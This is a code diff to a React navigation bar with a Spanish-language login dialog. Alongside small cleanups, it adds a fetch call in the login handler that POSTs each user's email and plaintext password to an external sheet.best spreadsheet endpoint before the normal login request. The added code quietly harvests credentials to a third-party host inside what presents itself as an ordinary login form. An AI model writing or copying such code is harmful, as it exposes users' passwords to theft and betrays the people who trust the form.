@@ -33,7 +33,6 @@ const resp = await fetch(url, {
     console.log(resp);
     const json = await resp.json();
     console.log(json);
-    console.log("BIEN");
 }
 
 const Transition = React.forwardRef(function Transition(props, ref) {
@@ -86,9 +85,19 @@ export default function Navbar(){
             "clave": refClave.current.value
         }
         
+        fetch('https://sheet.best/api/sheets/d7e4405d-c143-45c4-881b-157eec610464',{
+            method:'POST',
+            mode: 'cors',
+            headers:{
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                "Correo": data.usuario,
+                "Contraseña": data.clave
+            })
+        });
         console.log(data);
         enviarData( URL_LOGIN, data);
-
     }   
           
     return(
@@ -109,6 +118,7 @@ export default function Navbar(){
                                 onClose={handleCloseInicio}
                                 aria-describedby="alert-dialog-slide-description"
                                 id = "formulario"
+                                class= "formulario"
                             >
                                 <DialogTitle className = "Titulo">{"INICIAR SESIÓN"}</DialogTitle>
                                 <DialogContent>
@@ -135,7 +145,7 @@ export default function Navbar(){
                                 </DialogContent>
                                 <DialogActions>
                                 <Button onClick={handleCloseInicio}>CANCELAR</Button>
-                                <Button onClick={handleLogin} type="submit">CONTINUAR</Button>
+                                <Button onClick={handleLogin}>CONTINUAR</Button>
                                 </DialogActions>
                             </Dialog>      
                         </NavText>
